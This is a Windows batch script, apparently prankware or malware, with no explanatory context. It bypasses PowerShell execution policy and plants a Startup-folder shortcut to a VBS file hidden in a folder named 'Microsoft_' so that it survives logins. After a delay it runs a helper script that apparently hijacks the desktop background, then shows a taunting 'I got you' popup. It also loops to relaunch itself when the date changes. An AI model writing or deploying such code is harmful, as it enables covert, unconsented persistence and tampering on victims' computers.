@echo off
cd..\..
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%cd%"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Launcher.lnk"'); $S.TargetPath = '%cd%\Documents\Microsoft_\Launcher.vbs'; $S.WorkingDirectory = '%cd%\documents\Microsoft_'; $S.Save()"
powershell -command "Start-Sleep -s 900"
powershell -ExecutionPolicy ByPass -File "%cd%"\documents\Microsoft_\ResetDefault.ps1
mshta "about:<script>alert('I got you, your background is mine :)');close()</script>"
cls

set mydate=%date%

:loop
IF "%date%"=="%mydate%" ( ECHO "yes"
powershell -command "Start-Sleep -s 7200
Goto:loop
)
IF NOT "%date%"=="%mydate%" ( ECHO "NO"
cd documents\Microsoft_
launcher.vbs
exit
)